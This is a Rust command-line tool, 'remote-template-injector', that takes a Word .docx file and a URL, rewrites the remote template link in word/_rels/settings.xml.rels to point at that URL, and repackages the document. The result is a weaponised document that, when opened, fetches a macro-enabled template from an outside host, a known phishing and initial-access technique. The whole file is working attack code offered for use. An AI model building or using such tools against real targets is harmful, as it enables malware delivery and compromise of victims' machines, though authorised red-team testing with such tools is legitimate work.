use clap::Parser;
use std::{fs, fs::File, io, io::prelude::*, path::Path, process::exit};
use tempfile::tempdir;
use xmltree::*;
use zip::{result::ZipResult, ZipArchive, ZipWriter};

#[derive(Parser)]
#[clap(name = "remote-template-injector")]
#[clap(author = "Petruknisme <me@petruknisme.com>")]
#[clap(version = "1.0")]
#[clap(about = "VBA Macro Remote Template Injection written in Rust", long_about = None)]

struct Cli {
    /// Template URL
    #[clap(short, long)]
    url: String,

    /// File to be injected
    #[clap(short, long)]
    file: String,

    /// Output location of modified docx file
    #[clap(short, long)]
    output: String,
}

fn edit_xml_file(file_path: &str, new_target: &str) {
    // Find the Relationship element and update the value of the Target attribute

    let cfg = EmitterConfig {
        perform_indent: true,
        ..EmitterConfig::default()
    };

    // Parse the XML string into an Element tree
    let mut root = Element::parse(File::open(file_path).unwrap()).unwrap();

    let name = root.get_mut_child("Relationship").unwrap();
    name.attributes
        .insert("Target".to_string(), new_target.to_string());

    let mut buf = Vec::new();
    root.write_with_config(&mut buf, cfg).unwrap();

    let s = String::from_utf8(buf).unwrap();
    fs::write(file_path, s).unwrap();
}

fn check_setting_exist(file_path: &str) -> bool {
    let file = match File::open(file_path) {
        Ok(file) => file,
        Err(_) => {
            eprintln!("Error: Unable to open the zip file.");
            exit(1);
        }
    };
    let mut archive = match ZipArchive::new(file) {
        Ok(archive) => archive,
        Err(_) => {
            eprintln!("Error: Unable to read the zip file.");
            exit(1);
        }
    };

    // Check if the zip file contains "word/_rels/settings.xml.rels"
    for i in 0..archive.len() {
        let zip_file = match archive.by_index(i) {
            Ok(file) => file,
            Err(_) => continue, // Unable to read the file inside the zip file
        };
        if zip_file.name() == "word/_rels/settings.xml.rels" {
            return true;
        }
    }
    false
}

fn unzip(zipfile: &str, dest_dir: &str) -> ZipResult<()> {
    let file = fs::File::open(zipfile)?;
    let mut archive = ZipArchive::new(file)?;

    for i in 0..archive.len() {
        let mut file = archive.by_index(i)?;
        let filename = file.name();
        if filename.starts_with("__MACOSX") {
            continue;
        }
        let outpath = Path::new(dest_dir).join(filename);

        if (file.name()).ends_with('/') {
            fs::create_dir_all(&outpath)?;
        } else {
            if let Some(p) = outpath.parent() {
                if !p.exists() {
                    fs::create_dir_all(p)?;
                }
            }
            let mut outfile = fs::File::create(&outpath)?;
            io::copy(&mut file, &mut outfile)?;
        }
    }

    Ok(())
}

fn zip_dir(dir: &Path, zip: &mut ZipWriter<std::fs::File>, prefix: &Path) -> ZipResult<()> {
    let files = fs::read_dir(dir)?;

    for file in files {
        let file = file?;
        let path = file.path();
        let name = path.strip_prefix(prefix).unwrap();

        if path.is_file() {
            zip.start_file(name.to_str().unwrap(), zip::write::FileOptions::default())?;
            let mut f = fs::File::open(path)?;
            let mut buffer = Vec::new();
            f.read_to_end(&mut buffer)?;
            zip.write_all(&buffer)?;
        } else if path.is_dir() {
            zip_dir(&path, zip, prefix)?;
        }
    }

    Ok(())
}

fn main() {
    let cli = Cli::parse();
    let docx_file = cli.file;
    let output = cli.output;
    let target = cli.url;
    let file_name = Path::new(&docx_file).file_stem().unwrap().to_str().unwrap();

    if check_setting_exist(&docx_file) {
        let temp_dir = tempdir().expect("Failed to create temporary directory");

        {
            let temp_dir_path = temp_dir.path();
            let temp_dir_docx = &temp_dir_path.join(file_name).to_str().unwrap().to_string();
            let temp_dir_xml = &temp_dir_path
                .join(format!("{}/word/_rels/settings.xml.rels", file_name))
                .to_str()
                .unwrap()
                .to_string();

            unzip(&docx_file, temp_dir_docx).expect("Error unzipping the docx file");

            println!("{}", "Editing remote template url...");
            edit_xml_file(temp_dir_xml, &target);

            let dir = Path::new(&temp_dir_docx);
            let zipfile = &output;

            let prefix = dir;

            let file = fs::File::create(zipfile).unwrap();
            let mut zip = ZipWriter::new(file);

            zip_dir(dir, &mut zip, prefix).unwrap();
            zip.finish().unwrap();
            println!("Word successfully injected. Generated file: {}", output);
            println!("{}", "Good Luck!");
        }
    } else {
        eprintln!("Error: The zip file does not contain the file 'word/_rels/settings.xml.rels'.");
        exit(1);
    }
}
